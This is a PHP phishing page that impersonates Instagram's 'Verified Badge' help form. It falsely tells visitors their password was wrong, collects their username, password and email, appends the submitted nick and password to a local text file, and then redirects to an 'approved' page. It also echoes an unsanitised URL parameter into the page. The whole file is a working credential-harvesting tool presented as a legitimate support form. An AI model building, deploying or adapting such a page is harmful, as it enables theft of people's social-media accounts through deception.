<?php
error_reporting(0);

$nick=$_GET["nick"];
if($nick==="" || $nick===" "){$nick="instagram";}else if($nick==fale){$nick="instagram";}
if ($_POST) {
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$nick=$_GET["nick"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
	include('vendor/autoload.php');
     $file = fopen('txt.txt', 'a');
fwrite($file, "  : ".$nick."\n\n" ." password 2: ".$password. "\n\n");


fclose($file);

  
   header("Location: approved.php");
}


?>
 

 
<html lang="tr">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link href="css/style.css" type="text/css" rel="stylesheet"/>
	 <title>Verified Badge | Help Instagram</title>
	 <meta name="viewport" content="width=device-width">
<link rel="icon" href="image/fav.webp">	

</head>

<body>
    <div class="form">
    
<body id="ana" style="padding:0px; margin:0px;">




<div style="width:100%; background:white; border-bottom:1px; #cecece; padding-left:2px;" >
 




</div>


<center>

<div id="sa" style="border:1px; solid #cecece;"> 


<form method="post">
<br>
<img src="image/logo.png"<?php echo $nick ?> style="max-width:50%; border-radius:50%;">  <br>
 <br>
<h1 id="ripimt">Hi,</h1>

<p>fill in the form correctly. Otherwise we will not be able to help.
</p>
<p style="color: rgb(237, 73, 86); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center;"> Sorry, your password was wrong Please check your password carefully 
			</p>
  
       <input type="text" class="inputtext _55r1" name="inputReportedUsername" placeholder="Known Name" required="1"aria-required="true">
       
       <input type="password" name="password" placeholder="Password" required="">
      <input type="email" name="mail" placeholder="Email " required="">
         <br>
         <br>
         <br>
        <button id="buton" type="submit">confirm your password<?php echo $nick; ?> </button>

      </p>
    </form>
</div>
     
    
</div>
</center>
<center>
<br> 
<br>
<br>

<div id="get">
<img src="image/app.webp" width=120 >
<img src="image/play.webp" width=120>
</div>
<br><br><br>
<?php include 'footer.php'; ?>
